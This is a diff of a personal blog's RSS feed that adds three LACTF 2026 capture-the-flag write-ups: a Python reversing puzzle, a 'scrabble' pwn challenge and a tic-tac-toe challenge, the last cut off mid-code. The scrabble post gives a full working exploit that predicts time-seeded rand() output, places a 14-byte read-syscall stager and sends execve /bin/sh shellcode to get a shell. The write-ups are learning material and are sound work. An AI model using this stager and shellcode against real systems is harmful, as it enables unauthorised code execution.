@@ -4,9 +4,1126 @@
         <description><![CDATA[Markel's blog, mainly focused on Computer Science but also about other topics.]]></description>
         <link>https://markelmencia.com</link>
         <generator>RSS for Node</generator>
-        <lastBuildDate>Mon, 12 Jan 2026 17:27:19 GMT</lastBuildDate>
+        <lastBuildDate>Mon, 09 Feb 2026 19:19:07 GMT</lastBuildDate>
         <atom:link href="https://markelmencia.com/rss.xml" rel="self" type="application/rss+xml"/>
         <language><![CDATA[en]]></language>
+        <item>
+            <title><![CDATA[LACTF 2026: ooo]]></title>
+            <description><![CDATA[<h1>LACTF 2026: ooo</h1>
+<h4>February 9, 2026</h4>
+<p>This was a fun reversing challenge in this year's LACTF. We're given a Python script, which at first looks quite quirky:</p>
+<pre><code>def о(a, b):
+    return a+b
+def ο(a, b):
+    return a-b
+def օ(a, b):
+    return a*b
+def ỏ(a, b):
+    return a//b
+def ơ(a, b):
+    return a^b
+def ó(a, b):
+    return a|b
+def ὀ(a, b):
+    return a&#x26;b
+def ὸ(a, b):
+    return b-a
+def ὄ(a, b):
+    return a
+def ὂ(a, b):
+    return b
+def ȯ(a, b):
+    return a % b
+    
+
+ὁ = [205, 196, 215, 218, 225, 226, 1189, 2045, 2372, 9300, 8304, 660, 8243, 16057, 16113, 16057, 16004, 16007, 16006, 8561, 805, 346, 195, 201, 154, 146, 223]
+
+guess = input("What's the flag? ") # remember, flags start with lactf{
+
+if (len(guess) &#x3C; len(ὁ)):
+    print("That's too short :(")
+    exit()
+    
+for ö in range(len(ὁ)-1):
+    ό = ord(guess[ö])
+    ὃ = ord(guess[ö+1])
+    if (о(ὄ(ό,ὃ),ὂ(ό,ὃ)) != ὁ[ơ(ö,ȯ(օ(ό,ὃ),ό))]):
+        print("That's not the flag :(")
+        exit()
+    
+print("That's the flag! :)")
+</code></pre>
+<p>Now we see why the challenge is called "ooo".</p>
+<p>We have a bunch of functions and variables with very similar names. With nothing else to look at, I quickly started renaming the functions and variables, for the script to be much readable:</p>
+<pre><code>def aPlusB(a, b):
+    return a+b
+def aMinusB(a, b):
+    return a-b
+def aTimesB(a, b):
+    return a*b
+def ỏ(a, b):
+    return a//b
+def aXORb(a, b):
+    return a^b
+def ó(a, b):
+    return a|b
+def ὀ(a, b):
+    return a&#x26;b
+def ὸ(a, b):
+    return b-a
+def a(a, b):
+    return a
+def b(a, b):
+    return b
+def aModB(a, b):
+    return a % b
+    
+
+num_list = [205, 196, 215, 218, 225, 226, 1189, 2045, 2372, 9300, 8304, 660, 8243, 16057, 16113, 16057, 16004, 16007, 16006, 8561, 805, 346, 195, 201, 154, 146, 223]
+
+guess = input("What's the flag? ") # remember, flags start with lactf{
+
+if (len(guess) &#x3C; len(num_list)):
+    print("That's too short :(")
+    exit()
+    
+for num in range(len(num_list)-1):
+    arg1 = ord(guess[num])
+    arg2 = ord(guess[num+1])
+    if (aPlusB(a(arg1,arg2),b(arg1,arg2)) != num_list[aXORb(num,aModB(aTimesB(arg1,arg2),arg1))]):
+        print("That's not the flag :(")
+        exit()
+    
+print("That's the flag! :)")
+</code></pre>
+<p>I didn't refactor some of the functions above because they weren't used anywhere in code and thus, were useless. But now the code is more readable.</p>
+<p>For this challenge, we can use as input whatever we want, and the Python script will tell us if it's the flag or not. To do so, it uses this loop:</p>
+<pre><code>for num in range(len(num_list)-1):
+    arg1 = ord(guess[num])
+    arg2 = ord(guess[num+1])
+    if (aPlusB(a(arg1,arg2),b(arg1,arg2)) != num_list[aXORb(num,aModB(aTimesB(arg1,arg2),arg1))]):
+	    print("That's not the flag :(")
+        exit()
+    
+print("That's the flag! :)")
+</code></pre>
+<p>It seems appropriate to understand the condition that tells us that our input is not the flag:</p>
+<pre><code>if (aPlusB(a(arg1,arg2),b(arg1,arg2)) != num_list[aXORb(num,aModB(aTimesB(arg1,arg2),arg1))]):
+</code></pre>
+<p>To make it more readable, what I did was replacing the function calls with their functionality (what each function returns):</p>
+<pre><code>if (arg1 + arg2) != num_list[num ^ ((arg1 * arg2) % arg1)]:
+</code></pre>
+<p>Suddenly, this looks much more readable!</p>
+<p>Let's put our eyes on the operations in num_list[] now:</p>
+<pre><code>num_list[num ^ ((arg1 * arg2) % arg1)]
+</code></pre>
+<p>It turns out that these operations can be simplified quite easily with simple arithmetic! The module operation will always be zero. Multiplying <code>arg1</code> times <code>arg2</code>, and then dividing the result with <code>arg1</code>, will always return a remainder of <code>0</code>.</p>
+<pre><code>num_list[num ^ 0]
+</code></pre>
+<p>Now, all we have left is a XOR operation. It turns out that every number you XOR with a zero, will always be that same number, meaning...:</p>
+<pre><code>num_list[num]
+</code></pre>
+<p>Putting it all back together:</p>
+<pre><code>for num in range(len(num_list)-1):
+    arg1 = ord(guess[num])
+    arg2 = ord(guess[num+1])
+    if arg1 + arg2 != num_list[num]:
+	    print("That's not the flag :(")
+        exit()
+    
+print("That's the flag! :)")
+</code></pre>
+<p>That's much cleaner now isn't it?</p>
+<p>This is the algorithm that hints us what the flag is. Now, for challenges like these, bruteforcing always comes to mind. At the end of the day, flags contain readable characters, so there's only a few hundred characters we need to iterate through to get each flag character. The question is how.</p>
+<p>Well, we need to consider something. In order to get one flag character, the algorithm uses two characters of our input. The sum of their ASCII values must return the value in the list, at index <code>num</code>. That's the key to get the characters! Because there's a very important detail: We <em>do</em> know how the flag starts. It's in the CTF information, and also commented in the code: <code>lactf{</code>. This should be enough, let alone just the letter <code>l</code>, which we know is the first. With this character we can get the second one just by subtracting the corresponding value in the list to that character. To understand this properly, I'll give an example for the first iteration:</p>
+<p>We start with the first character, <code>l</code>. Its ASCII value is <code>108</code>. Since we are in the first iteration, we check the value at index <code>0</code> in <code>num_list</code>. The value is <code>205</code>. According to the algorithm, the next character is whatever value we need to get <code>205</code> when added to <code>108</code>. <code>108 + x = 205</code>, which gives us the value <code>97</code>, the letter <code>a</code>. That checks out, because the we know the flag starts with <code>lactf{</code>. Let's write this algorithm into code in a new file:</p>
+<pre><code>num_array = [205, 196, 215, 218, 225, 226, 1189, 2045, 2372, 9300, 8304, 660, 8243, 16057, 16113, 16057, 16004, 16007, 16006, 8561, 805, 346, 195, 201, 154, 146, 223]
+
+solve = "" # Will contain the flag
+known = ord("l") # The known character, starts being "l"
+for num in range(len(num_array)):
+	# We add the known character to the flag
+    solve = solve + chr(known)
+    
+    # We get the next character
+    unknown = num_array[num] - known
+    
+    # Now the next character is our known character
+    known = unknown 
+
+# We print the *almost* finished flag
+print(solve)
+</code></pre>
+<p>Let's see it in action:</p>
+<pre><code>$ python3 solve.py
+lactf{gоοօỏơóὀόὸὁὃὄὂȯöd_j0b
+</code></pre>
+<p>That should do! However, we don't get the last character. That's fine though, we assume the last character is <code>}</code>. That's our flag!</p>
+]]></description>
+            <link>https://markelmencia.com/writeups/lactf-2026-ooo-writeup</link>
+            <guid isPermaLink="true">https://markelmencia.com/writeups/lactf-2026-ooo-writeup</guid>
+            <pubDate>Mon, 09 Feb 2026 00:00:00 GMT</pubDate>
+        </item>
+        <item>
+            <title><![CDATA[LACTF 2026: scrabble]]></title>
+            <description><![CDATA[<h1>LACTF 2026: scrabble</h1>
+<h4>February 9, 2026</h4>
+<p>This is probably the hardest challenge I've done to date. It's a Pwn challenge that simulates a sort of Scrabble game.</p>
+<p>We're given this code:</p>
+<pre><code>#include &#x3C;stdio.h>
+#include &#x3C;stdlib.h>
+#include &#x3C;string.h>
+#include &#x3C;time.h>
+#include &#x3C;sys/mman.h>
+#include &#x3C;unistd.h>
+
+#define HAND_SIZE 14
+#define BOARD_ADDR 0x13370000UL
+#define BOARD_SIZE 0x1000
+
+void banner() {
+    puts("");
+    puts("    .=========================================.");
+    puts("    |  +---+---+---+---+---+---+---+---+      |");
+    puts("    |  | S | c | r | a | b | A | S | M |      |");
+    puts("    |  | 1 | 3 | 1 | 1 | 3 | 1 | 1 | 3 |      |");
+    puts("    |  +---+---+---+---+---+---+---+---+      |");
+    puts("    |                                         |");
+    puts("    |   The word game where bytes are tiles   |");
+    puts("    |     and the board runs your code!       |");
+    puts("    '========================================='");
+    puts("");
+    printf("    Board: 0x%lx    Tiles: %d\n", BOARD_ADDR, HAND_SIZE);
+    puts("");
+}
+
+void view_hand(unsigned char *hand) {
+    printf("    ");
+    for (int i = 0; i &#x3C; HAND_SIZE; i++) printf("+----");
+    puts("+");
+    printf("    ");
+    for (int i = 0; i &#x3C; HAND_SIZE; i++) printf("| %02x ", hand[i]);
+    puts("|");
+    printf("    ");
+    for (int i = 0; i &#x3C; HAND_SIZE; i++) printf("+----");
+    puts("+");
+    printf("    ");
+    for (int i = 0; i &#x3C; HAND_SIZE; i++) printf(" %2d  ", i);
+    puts("");
+    puts("");
+}
+
+void swap_tile(unsigned char *hand) {
+    char line[32];
+    printf("    Which tile? (0-%d): ", HAND_SIZE - 1);
+    if (!fgets(line, sizeof(line), stdin)) return;
+    int idx = atoi(line);
+    if (idx &#x3C; 0 || idx >= HAND_SIZE) {
+        puts("    Invalid tile!");
+        return;
+    }
+    hand[idx] = rand() &#x26; 0xFF;
+    puts("    Tile swapped!");
+}
+
+void play(unsigned char *hand) {
+    void *board = mmap((void *)BOARD_ADDR, BOARD_SIZE,
+                       PROT_READ | PROT_WRITE | PROT_EXEC,
+                       MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
+    if (board == MAP_FAILED) {
+        perror("    mmap");
+        exit(1);
+    }
+
+    puts("");
+    puts("    Playing your word...");
+    puts("    TRIPLE WORD SCORE!");
+    puts("");
+
+    memcpy(board, hand, HAND_SIZE);
+    ((void (*)(void))board)();
+}
+
+int main() {
+    setbuf(stdout, NULL);
+    setbuf(stdin, NULL);
+
+    srand(time(NULL));
+
+    unsigned char hand[HAND_SIZE];
+    for (int i = 0; i &#x3C; HAND_SIZE; i++)
+        hand[i] = rand() &#x26; 0xFF;
+
+    banner();
+
+    puts("    Your starting tiles:");
+    view_hand(hand);
+
+    char line[32];
+    while (1) {
+        puts("    1) Swap a tile");
+        puts("    2) Play!");
+        printf("    > ");
+        if (!fgets(line, sizeof(line), stdin)) break;
+        int choice = atoi(line);
+        switch (choice) {
+            case 1: swap_tile(hand); break;
+            case 2: play(hand); return 0;
+            default: puts("    Invalid choice!"); break;
+        }
+    }
+
+    return 0;
+}
+</code></pre>
+<p>Like in the <a href="lactf-2026-tic-tac-no">tic-tac-no</a> challenge, this is a lot of code. Let's look at what happens when we execute the binary:</p>
+<pre><code>$ ./chall
+
+    .=========================================.
+    |  +---+---+---+---+---+---+---+---+      |
+    |  | S | c | r | a | b | A | S | M |      |
+    |  | 1 | 3 | 1 | 1 | 3 | 1 | 1 | 3 |      |
+    |  +---+---+---+---+---+---+---+---+      |
+    |                                         |
+    |   The word game where bytes are tiles   |
+    |     and the board runs your code!       |
+    '========================================='
+
+    Board: 0x13370000    Tiles: 14
+
+    Your starting tiles:
+    +----+----+----+----+----+----+----+----+----+----+----+----+----+----+
+    | d5 | a8 | bd | 42 | dc | f8 | 2b | 17 | 07 | 64 | c8 | 71 | 15 | a5 |
+    +----+----+----+----+----+----+----+----+----+----+----+----+----+----+
+      0    1    2    3    4    5    6    7    8    9   10   11   12   13  
+
+    1) Swap a tile
+    2) Play!
+    > 
+</code></pre>
+<p>Running the first option opens this menu:</p>
+<pre><code>	1) Swap a tile
+    2) Play!
+    > 1
+    Which tile? (0-13): 0
+    Tile swapped!
+    3) Swap a tile
+    4) Play!
+    > 
+</code></pre>
+<p>I actually have never played Scrabble, so I don't know what the rules are, but in this challenge the tile you select will randomly change to a different byte.</p>
+<p>Now let's check the "Play" option:</p>
+<pre><code>    1) Swap a tile
+    2) Play!
+    > 2
+
+    Playing your word...
+    TRIPLE WORD SCORE!
+
+[1]    65726 illegal hardware instruction  ./chall
+</code></pre>
+<p>Interesting! From the looks of it, it seems like this program executes the board we created as instructions! That's quite important, because the program itself is giving us the possibility of executing an array we have writing permissions on. The issue is quite apparent, though. We don't really have full control of the bytes, because when we want to swap a specific tile, the value of it is randomized. We can see this in the <code>swap_tile</code> function:</p>
+<pre><code>void swap_tile(unsigned char *hand) {
+    char line[32];
+    printf("    Which tile? (0-%d): ", HAND_SIZE - 1);
+    if (!fgets(line, sizeof(line), stdin)) return;
+    int idx = atoi(line);
+    if (idx &#x3C; 0 || idx >= HAND_SIZE) {
+        puts("    Invalid tile!");
+        return;
+    }
+    hand[idx] = rand() &#x26; 0xFF;
+    puts("    Tile swapped!");
+}
+</code></pre>
+<p>Let's also check the <code>play</code> function. It's quite important because it's what will execute our "shellcode":</p>
+<pre><code>void play(unsigned char *hand) {
+    void *board = mmap((void *)BOARD_ADDR, BOARD_SIZE,
+                       PROT_READ | PROT_WRITE | PROT_EXEC,
+                       MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
+    if (board == MAP_FAILED) {
+        perror("    mmap");
+        exit(1);
+    }
+
+    puts("");
+    puts("    Playing your word...");
+    puts("    TRIPLE WORD SCORE!");
+    puts("");
+
+    memcpy(board, hand, HAND_SIZE);
+    ((void (*)(void))board)();
+}
+</code></pre>
+<p>Here we confirm our suspicion that the board does get executed. First, with <code>mmap</code>, we map a region in memory that has execution permissions. Checking <code>BOARD_SIZE</code>, the size of this region is <code>0x1000</code>. Any instruction we somehow move in here will be able to be executed.</p>
+<p>Then, the actual Scrabble bytes in the hand get copied into the region. However, only <code>HAND_SIZE</code> bytes get copied, 14. This means that the mapped region is actually much bigger than the content the program copies into it. This will be important later on. A important roadblock is that the region we have control over is actually only 14 bytes long, not nearly enough for a <code>/bin/sh</code> or <code>cat /flag</code> shellcode.</p>
+<p>Anyhow, there's a bigger issue on our hands. We're not even able to create a hand with arbitrary values, because the values we swap into it are random. Let's see how we can tackle this issue:</p>
+<h2>Defeating randomness</h2>
+<p>It's quite easy to just drop the vulnerability and how to exploit it, but this took hours for me. I focused a lot on the way inputs were treated, thinking an overflow lied somewhere. It wasn't it. The point I'm making is that most of the time, finding the vulnerability is much more time-consuming than finding out a way to exploit it. So yeah. This took quite a while.</p>
+<p>The vulnerability of this challenge lies in the way the numbers are generated. Let's see some code:</p>
+<pre><code>srand(time(NULL));
+
+unsigned char hand[HAND_SIZE];
+for (int i = 0; i &#x3C; HAND_SIZE; i++)
+    hand[i] = rand() &#x26; 0xFF;
+</code></pre>
+<p>This is one part of <code>main</code>. <code>srand</code> defines the seed of the program. When you give it <code>time(NULL)</code> you're using your current UNIX timestamp as a seed. It is common practice, because the seed changes every second you execute it, which means you'll get a different sequence of numbers every different second in which you execute the program. It is also a practice that leads to a vulnerability.</p>
+<p>In C, the numbers generated by <code>rand</code> aren't actually random. You give it a seed, and the algorithm it uses will generate a sequence of deterministic numbers. They <em>will</em> feel random, but the same seed will always generate the same numbers. This means that, if we know the seed one process uses, we will be able to completely predict the numbers that process will generate. Since we know that the seed used is the UNIX timestamp of the second in which the program is executed, we actually can predict the bytes the program will generate! Let's test this out with a simple script:</p>
+<pre><code>import random
+import time
+from pwn import *
+import ctypes
+
+p = process("./chall")
+libc = ctypes.CDLL("libc.so.6")
+
+seed = int(time.time())
+libc.srand(seed)
+
+print("Bytes that will be generated")
+for _ in range(14):
+    print(hex(libc.rand() &#x26; 0xff))
+    
+p.interactive()
+</code></pre>
+<p>This script will create a process that runs the challenge binary. It will also use <code>ctypes</code> to load <code>libc</code> into the Python script so we can use the very same <code>rand</code> in it. As you can see, we set the current UNIX timestamp as the seed. This is the very same seed the Scrabble program will have, because it will be executed on the very same second we execute the Python script. And since we use the same algorithm in both sides, we can generate in the script the next 14 numbers (as we do in the for loop) the program will generate. These numbers will be the same that will be generated in the challenge program. Then, I call <code>p.interactive()</code> to see the output of the program and verify that we do know the numbers. Let's see it in action:</p>
+<pre><code>$ python3 seedtest.py
+[+] Starting local process './chall': pid 87175
+Bytes that will be generated
+0x1
+0xb5
+0xba
+0xdd
+0x26
+0x4c
+0x1c
+0x3b
+0x90
+0x14
+0x16
+0x86
+0xba
+0x97
+[*] Switching to interactive mode
+
+    .=========================================.
+    |  +---+---+---+---+---+---+---+---+      |
+    |  | S | c | r | a | b | A | S | M |      |
+    |  | 1 | 3 | 1 | 1 | 3 | 1 | 1 | 3 |      |
+    |  +---+---+---+---+---+---+---+---+      |
+    |                                         |
+    |   The word game where bytes are tiles   |
+    |     and the board runs your code!       |
+    '========================================='
+
+    Board: 0x13370000    Tiles: 14
+
+    Your starting tiles:
+    +----+----+----+----+----+----+----+----+----+----+----+----+----+----+
+    | 01 | b5 | ba | dd | 26 | 4c | 1c | 3b | 90 | 14 | 16 | 86 | ba | 97 |
+    +----+----+----+----+----+----+----+----+----+----+----+----+----+----+
+      0    1    2    3    4    5    6    7    8    9   10   11   12   13  
+
+    1) Swap a tile
+    2) Play!
+    > $  
+</code></pre>
+<p>Sure enough! We were able to predict the bytes the challenge would generate! We predicted 14 numbers, but why stop there? We can predict any next number that will be generated.</p>
+<p>So here is how we can use this to our advantage: we've mentioned before how we can only swap random numbers into our Scrabble hand. Now this is not an issue anymore. Since we know the sequence the program will use, we have the upper hand. We can just keep generating numbers until one we want appears. This can be bruteforced pretty easily!</p>
+<pre><code>count = 0
+desired_number = 0xAE
+number = -1
+while (number != desired_number):
+	number = libc.rand() &#x26; 0xff
+	count += 1
+</code></pre>
+<p>With this loop, we'll increment the variable <code>count</code> for every generated number that isn't the desired number we want. In this case, <code>0xAE</code>. Now, if we execute "Swap a tile" that same number of times, we'll have the desired byte we want!</p>
+<pre><code>for _ in range(count):
+	p.sendlineafter(b">", b"1") # We choose the swap option
+	p.sendlineafter(b"(0-13): ", b"3") # We choose tile 3
+</code></pre>
+<p>Let's create a function for this and add it to our script:</p>
+<pre><code>def bruteforce_byte(desired_num, tile_index):
+    # Gets the amount of times we'll have to generate
+    # numbers before we get desired_num
+    num = -1
+    numbers_generated = 0
+    while (num != desired_num):
+        num = libc.rand() &#x26; 0xFF
+        numbers_generated += 1
+
+    # Interacts with the binary the necessary number
+    # of times to generate it in the desired tile_index.
+    for _ in range(numbers_generated):
+        p.sendlineafter(b">", b"1")
+        p.sendlineafter(b"Which tile? (0-13): ", str(tile_index).encode())
+</code></pre>
+<p>Great! Now we have arbitrary control on every tile of the hand. This is a lot of progress, coming from a program that initially only allowed us to generate random numbers. With this in mind, it's time to think about the shellcode.</p>
+<h2>The shellcode</h2>
+<p>While I was still finding out how to write arbitrary values to the Scrabble hand, our team and I were worried about how little the potential shellcode was going to be. 14 bytes isn't much, and if you don't play your cards right, you can barely fit any instruction in them. A lot of ideas came to mind to work around this. Building a ROP chain, somehow perform a ret2libc exploit, calling already executed functions with the hopes of finding a bug that would give us more freedom... most of these ideas weren't feasible because ASLR is activated in the binary. At some point, I was convinced that I was missing a buffer overflow somewhere. Coincidentally, the binary doesn't have a stack canary. Still, I found nothing.</p>
+<p>Then I started thinking. Something I haven't mentioned yet is that the hand gets mapped into a fixed address, <code>0x13370000</code>. I thought that this was for a reason. So I began thinking about more creative ways to expand our shellcode. The first idea that came to mind had to do with <code>memcpy</code>. Inspired by the way the hand was copied into the mapped region, I thought I could do something similar: copying a useful snippet of code somewhere into <code>0x13370000+14</code>, to continue the shellcode. This wasn't feasible either because of ASLR, so I even thought about copying values there directly, but that just moved the problem elsewhere.</p>
+<p>The solution was less quirky. Instead of looking for useful code in the binary, why don't I generate it myself? Sure, I can't do it with the binary code itself, but can I fit a <code>read</code> syscall shellcode in 14 bytes so you can input through <code>stdin</code> as much data as I want? This would fix the 14 bytes issue. Since the mapped address is fixed, I can just read as much input as I can from <code>stdin</code> (where I don't have the 14-byte restriction) and store the input in <code>0x1337000E</code>, right next to the Scrabble shellcode. There, I could inject the actual shellcode that would give me access to the flag, because I'd save space for it. Well, it turns out that you can, and with only 13 bytes too!</p>
+<pre><code>.global _start
+_start:
+.intel_syntax noprefix
+	xor eax, eax # eax = 0 (read syscall code)
+	xor edi, edi # rdi = 0 (uses file descriptor 0 (stdin))
+	mov esi, 0x1337000e # esi = 0x1337000e (Address after our shellcode)
+	mov dl, 255 # rdx = 255 (Reads 255 bytes)
+	nop # Reminding byte, not needed :)
+	syscall
+</code></pre>
+<p>This assembly code sets up a <code>read</code> syscall, that reads 255 bytes in <code>stdin</code> and stores them in <code>0x1337000E</code>.  This expands our shellcode 255 more bytes. That's more than enough space to fit a <code>/bin/sh</code> shellcode. When the <code>read</code> shellcode gets executed, <code>stdin</code> will be opened. In there, we'll write a <code>/bin/sh</code> shellcode. Since it will be copied right after the last instruction of the shellcode, it will be executed as if it was just more code. Ideally, this should grant us access to a shell in which we can <code>cat</code> the flag.</p>
+<p>Let's turn this assembly code into a proper shellcode. The instruction bytes, that is. There's two commands we need for this:</p>
+<pre><code>$ gcc -nostdlib -static read_shellcode.s -o read_shellcode-elf
+$ objcopy --dump-section .text=read_shellcode-raw read_shellcode-elf
+</code></pre>
+<p>This will compile the assembly and then extract the <code>.text</code>  section, which contains the raw bytes of the instructions, nothing more. This will be in <code>read_shellcode-raw</code>. Let's check the hexdump:</p>
+<pre><code>$ xxd read_shellcode-raw
+00000000: 31c0 31ff be0e 0037 13b2 ff90 0f05       1.1....7......
+</code></pre>
+<p>These are the bytes that will need to be in the Scrabble hand. We can add them with the function we made before:</p>
+<pre><code>bruteforce_byte(0x31, 0)
+bruteforce_byte(0xc0, 1)
+bruteforce_byte(0x31, 2)
+bruteforce_byte(0xff, 3)
+bruteforce_byte(0xbe, 4)
+bruteforce_byte(0x0e, 5)
+bruteforce_byte(0x00, 6)
+bruteforce_byte(0x37, 7)
+bruteforce_byte(0x13, 8)
+bruteforce_byte(0xb2, 9)
+bruteforce_byte(0xff, 10)
+bruteforce_byte(0x90, 11)
+bruteforce_byte(0x0f, 12)
+bruteforce_byte(0x05, 13)
+</code></pre>
+<p>Now, instead of opening the binary as a simple process, I'll open it in a GDB instance to showcase that this does indeed work:</p>
+<pre><code>p = gdb.debug(elf.path, gdbscript="""
+break *play+173
+continue""")
+</code></pre>
+<p>I took the liberty to add a breakpoint in <code>play</code>, right before executing the shellcode. Now let's run it:</p>
+<pre><code>$ python3 solve.py
+pwndbg> x/14bx 0x13370000
+0x13370000:     0x31    0xc0    0x31    0xff    0xbe    0x0e    0x00    0x37
+0x13370008:     0x13    0xb2    0xff    0x90    0x0f    0x05
+</code></pre>
+<p>Great! The shellcode's all set up. We can even check that the instructions are actually correct:</p>
+<pre><code>pwndbg> x/6i 0x13370000
+0x13370000:  xor    eax,eax
+0x13370002:  xor    edi,edi
+0x13370004:  mov    esi,0x1337000e
+0x13370009:  mov    dl,0xff
+0x1337000b:  nop
+0x1337000c:  syscall
+</code></pre>
+<p>We're almost done, now we just need to add a <code>p.send()</code> call to move the <code>/bin/sh</code> shellcode to the mapped memory. But first, let's build it in assembly:</p>
+<pre><code>.global _start
+_start:
+.intel_syntax noprefix
+	xor rsi,rsi
+	push rsi
+	mov rdi,0x68732f2f6e69622f
+	push rdi
+	push rsp
+	pop rdi
+	push 59
+	pop rax
+	cdq
+	syscall
+</code></pre>
+<p>I didn't even bother to make this one myself. There's so many <code>/bin/sh</code> shellcodes online that you don't really have much to worry about. This shellcode uses the stack to run an <code>execve</code> syscall that runs <code>/bin/sh</code>, essentially opening a shell. Just like with the other shellcode, we compile it and extract the <code>.text</code> section:</p>
+<pre><code>$ gcc -nostdlib -static execve_shellcode.s -o execve_shellcode-elf
+$ objcopy --dump-section .text=execve_shellcode-raw execve_shellcode-elf
+</code></pre>
+<p>Since this shellcode is longer, I'll just open <code>execve_shellcode-raw</code> as a binary file in the Python script and read it there:</p>
+<pre><code>execve_shellcode = open("execve_shellcode-raw", "rb").read()
+</code></pre>
+<p>Now we can send it to the process after executing the "Play" option. This is the last thing we need to add to the script, so I'll paste the whole thing:</p>
+<pre><code>import random
+import time
+from pwn import *
+import ctypes
+
+
+def bruteforce_byte(desired_num, tile_index):
+    # Gets the amount of times we'll have to generate numbers before we get desired_num
+    num = -1
+    numbers_generated = 0
+    while (num != desired_num):
+        num = libc.rand() &#x26; 0xFF
+        numbers_generated += 1
+
+    # Interacts with the binary the necessary number of times to generate it in the desired tile_index.
+    for _ in range(numbers_generated):
+        p.sendlineafter(b">", b"1")
+        p.sendlineafter(b"Which tile? (0-13): ", str(tile_index).encode())
+
+
+# Opens the remote connection
+p = remote("127.0.0.1", 5000)
+
+# Loads libc into the script
+libc = ctypes.CDLL("libc.so.6")
+seed = int(time.time())
+libc.srand(seed)
+
+# Generates the first 14 bytes of the binary (the initial Scrabble hand)
+for _ in range(14):
+    libc.rand() &#x26; 0xFF 
+
+# Generates the read shellcode
+bruteforce_byte(0x31, 0)
+bruteforce_byte(0xc0, 1)
+bruteforce_byte(0x31, 2)
+bruteforce_byte(0xff, 3)
+bruteforce_byte(0xbe, 4)
+bruteforce_byte(0x0e, 5)
+bruteforce_byte(0x00, 6)
+bruteforce_byte(0x37, 7)
+bruteforce_byte(0x13, 8)
+bruteforce_byte(0xb2, 9)
+bruteforce_byte(0xff, 10)
+bruteforce_byte(0x90, 11)
+bruteforce_byte(0x0f, 12)
+bruteforce_byte(0x05, 13)
+
+# Executes the generated shellcode
+p.sendlineafter(b">", b"2")
+
+# Sends the execve shellcode to the read shellcode, expanding our payload
+shellcode2 = open("shellcode-2-raw", "rb").read()
+p.send(shellcode2)
+p.interactive() # We set the interactive mode to be able to interact with the shell
+</code></pre>
+<p>Notice how now I open a remote connection to a port in localhost. This is the docker file that the challenge gave us. I connect to this because the CTF is over as of the time I'm writing this. I also did not beat this in time. Nevertheless, the docker instance works as a showcase that this exploit works:</p>
+<pre><code>$ python3 solve.py
+[+] Opening connection to 127.0.0.1 on port 5000: Done
+[*] Switching to interactive mode
+
+	Playing your word...
+	TRIPLE WORD SCORE!
+	
+$ ls 
+flag.txt
+run
+$ cat flag.txt
+lactf{flag}
+$
+</code></pre>
+<p>That should be enough for us to get the flag!</p>
+<p>As I've mentioned in the beginning, this might just be the hardest Pwn challenge I've beaten. It took me several hours, and quite frankly, I wasn't sure at all I was going to beat it before giving up. I'm quite proud I did though!</p>
+]]></description>
+            <link>https://markelmencia.com/writeups/lactf-2026-scrabble-writeup</link>
+            <guid isPermaLink="true">https://markelmencia.com/writeups/lactf-2026-scrabble-writeup</guid>
+            <pubDate>Mon, 09 Feb 2026 00:00:00 GMT</pubDate>
+        </item>
+        <item>
+            <title><![CDATA[LACTF 2026: tic-tac-no]]></title>
+            <description><![CDATA[<h1>LACTF 2026: tic-tac-no</h1>
+<h4>February 9, 2026</h4>
+<p>This Pwn challenge gives us a binary (and its code). The binary is a classic Tic-Tac-Toe implementation. This is a solved game which can always be tied with perfect play, and this binary contains an algorithm to do just that. Our goal is to somehow win against the algorithm, even though it shouldn't really be possible. Here's the full code:</p>
+<pre><code>#include &#x3C;stdio.h>
+#include &#x3C;stdbool.h>
+#include &#x3C;string.h>
+
+char board[9];
+char player = 'X';
+char computer = 'O';
+void initializeBoard();
+void printBoard();
+int checkWin();
+int checkFreeSpaces();
+void playerMove();
+void perfectComputerMove();
+int minimax(char board[9], int depth, bool isMaximizing);
+
+int main() {
+   setbuf(stdout, NULL);
+   char winner = ' ';
+   char response = ' ';
+   printf("You want the flag? You'll have to beat me first!");
+   for (int i = 0; i &#x3C; 9; i++) {
+         board[i] = ' ';
+   }
+
+   while (winner == ' ' &#x26;&#x26; checkFreeSpaces() != 0) {
+      printBoard();
+
+      playerMove();
+      winner = checkWin();
+      if (winner != ' ' || checkFreeSpaces() == 0) {
+         break;
+      }
+
+      perfectComputerMove();
+      winner = checkWin();
+      if (winner != ' ' || checkFreeSpaces() == 0) {
+         break;
+      }
+   }
+
+   printBoard();
+   if (winner == player) {
+      printf("How's this possible? Well, I guess I'll have to give you the flag now.\n");
+      FILE* flag = fopen("flag.txt", "r");
+      char buf[256];
+      fgets(buf, 256, flag);
+      buf[strcspn(buf, "\n")] = '\0';
+      puts(buf);
+   }
+   else {
+      printf("Nice try, but I'm still unbeatable.\n");
+   }
+
+   return 0;
+}
+
+void printBoard() {
+   printf("\n");
+   printf(" %c | %c | %c \n", board[0], board[1], board[2]);
+   printf("---|---|---\n");
+   printf(" %c | %c | %c \n", board[3], board[4], board[5]);
+   printf("---|---|---\n");
+   printf(" %c | %c | %c \n", board[6], board[7], board[8]);
+   printf("\n");
+}
+
+int checkFreeSpaces() {
+   int freeSpaces = 0;
+   for (int i = 0; i &#x3C; 9; i++) {
+      if (board[i] == ' ') {
+         freeSpaces++;
+      }
+   }
+   return freeSpaces;
+}
+
+void playerMove() {
+   int x, y;
+   do{
+      printf("Enter row #(1-3): ");
+      scanf("%d", &#x26;x);
+      printf("Enter column #(1-3): ");
+      scanf("%d", &#x26;y);
+      int index = (x-1)*3+(y-1);
+      if(index >= 0 &#x26;&#x26; index &#x3C; 9 &#x26;&#x26; board[index] != ' '){
+         printf("Invalid move.\n");
+      }else{
+         board[index] = player; // Should be safe, given that the user cannot overwrite tiles on the board
+         break;
+      }
+   }while(1);
+}
+
+int checkWin() {
+   for (int i = 0; i &#x3C; 3; i++) {
+      if (board[3*i] == board[3*i+1] &#x26;&#x26; board[3*i] == board[3*i+2] &#x26;&#x26; board[3*i] != ' ')
+         return board[3*i];
+   }
+   for (int i = 0; i &#x3C; 3; i++) {
+      if (board[i] == board[3+i] &#x26;&#x26; board[i] == board[6+i] &#x26;&#x26; board[i] != ' ')
+         return board[i];
+   }
+   if (board[0] == board[4] &#x26;&#x26; board[0] == board[8] &#x26;&#x26; board[0] != ' ')
+      return board[0];
+   if (board[2] == board[4] &#x26;&#x26; board[2] == board[6] &#x26;&#x26; board[2] != ' ')
+      return board[2];
+
+   return ' ';
+}
+
+int minimax(char board[9], int depth, bool isMaximizing) {
+   int result = checkWin();
+
+   if (result == computer) return 10 - depth;
